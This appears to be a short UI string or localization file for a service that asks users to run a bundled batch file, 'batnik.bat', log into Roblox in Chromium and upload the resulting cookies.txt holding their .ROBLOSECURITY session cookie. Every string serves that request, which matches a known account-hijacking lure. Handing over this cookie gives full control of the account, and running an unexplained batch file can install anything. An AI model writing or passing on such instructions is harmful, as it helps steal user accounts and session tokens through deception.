cookie.instructions: Use the kit below to extract your .ROBLOSECURITY cookie in Chromium and upload it here as a .txt.
cookie.kit_caption: Kit to extract cookie (.ROBLOSECURITY). Run batnik.bat, log in, press Enter, then send cookies.txt here.
cookie.instructions_short:
1) Unzip
2) Run batnik.bat
3) Login to Roblox in Chromium
4) Press Enter
5) Take cookies.txt
